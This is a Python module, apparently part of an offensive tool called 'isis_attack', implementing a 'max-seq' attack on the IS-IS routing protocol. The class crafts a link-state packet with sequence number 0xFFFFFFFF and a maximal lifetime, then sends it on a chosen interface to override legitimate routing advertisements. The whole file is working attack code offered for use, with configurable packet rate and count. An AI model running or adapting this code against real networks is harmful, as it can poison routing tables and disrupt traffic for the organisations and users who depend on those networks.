from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender

MAX_ISIS_SEQ = 0xFFFFFFFF


class MaxSeqAttack(BaseAttack):
    name = "max-seq"
    description = "发送 Sequence=0xFFFFFFFF 的 LSP 覆盖合法 LSP"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=MAX_ISIS_SEQ, remaining_lifetime=65535,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Max-Seq 攻击: Seq=0x{MAX_ISIS_SEQ:08X}",
        )

